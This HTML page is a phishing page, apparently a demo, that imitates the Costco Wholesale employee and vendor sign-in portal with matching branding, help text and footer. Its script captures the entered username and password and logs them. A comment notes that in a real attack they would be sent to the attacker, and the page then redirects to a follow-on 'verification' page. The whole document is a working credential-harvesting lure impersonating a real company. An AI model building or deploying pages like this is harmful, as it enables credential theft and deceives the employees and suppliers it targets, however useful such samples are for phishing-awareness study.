<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Costco Wholesale - Employee Portal</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #f5f5f5 0%, #e8e8e8 100%);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 20px;
        }

        .header {
            margin-bottom: 20px;
            text-align: left;
            max-width: 600px;
            width: 100%;
        }

        .logo {
            max-width: 300px;
            height: auto;
        }

        .login-container {
            background: white;
            border-radius: 8px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
            padding: 40px;
            width: 100%;
            max-width: 600px;
            border: 1px solid #ddd;
        }

        .login-title {
            font-size: 28px;
            font-weight: normal;
            color: #333;
            margin-bottom: 30px;
            text-align: left;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-label {
            display: block;
            font-size: 14px;
            font-weight: normal;
            color: #333;
            margin-bottom: 8px;
        }

        .form-input {
            width: 100%;
            padding: 12px;
            border: 2px solid #ccc;
            border-radius: 4px;
            font-size: 14px;
            background-color: #fff;
            transition: border-color 0.3s;
        }

        .form-input:focus {
            outline: none;
            border-color: #0084c7;
        }

        .help-text {
            font-size: 12px;
            color: #666;
            margin-top: 5px;
            line-height: 1.4;
        }

        .sign-in-btn {
            background-color: #0084c7;
            color: white;
            border: none;
            padding: 12px 24px;
            font-size: 14px;
            font-weight: bold;
            border-radius: 4px;
            cursor: pointer;
            margin-right: 15px;
            transition: background-color 0.3s;
        }

        .sign-in-btn:hover {
            background-color: #006ba3;
        }

        .trouble-link {
            color: #0084c7;
            text-decoration: none;
            font-size: 14px;
        }

        .trouble-link:hover {
            text-decoration: underline;
        }

        .buttons-container {
            margin-top: 25px;
            display: flex;
            align-items: center;
        }

        .footer {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            background-color: #333333;
            color: white;
            text-align: center;
            padding: 20px 20px;
            font-size: 14px;
            z-index: 1000;
        }

    </style>
</head>
<body>
    <div class="header">
        <img src="costco_logo.png" alt="Costco Wholesale" class="logo">
    </div>

    <div class="login-container">
        <h1 class="login-title">Sign In</h1>
        
        <form id="loginForm">
            <div class="form-group">
                <label for="username" class="form-label">Username</label>
                <input type="text" id="username" name="username" class="form-input" required>
                <div class="help-text">
                    Employees/Alumni = My Costco Account (LAN ID)<br>
                    Vendors/Suppliers = E-mail Address
                </div>
            </div>

            <div class="form-group">
                <label for="password" class="form-label">Password</label>
                <input type="password" id="password" name="password" class="form-input" required>
                <div class="help-text">
                    Password is case sensitive.
                </div>
            </div>

            <div class="buttons-container">
                <button type="submit" class="sign-in-btn">Sign In</button>
                <a href="#" class="trouble-link">Trouble Signing In?</a>
            </div>
        </form>
    </div>

    <div class="footer">
        Â© Copyright Costco Wholesale Corporation 2025
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            // Capture the credentials (in real attack, this would be sent to attacker)
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;
            
            // For demo purposes, just log to console
            console.log('Captured credentials:', { username, password });
            
            // Redirect to verification intro
            window.location.href = 'verification-intro.html';
        });
    </script>
</body>
</html>
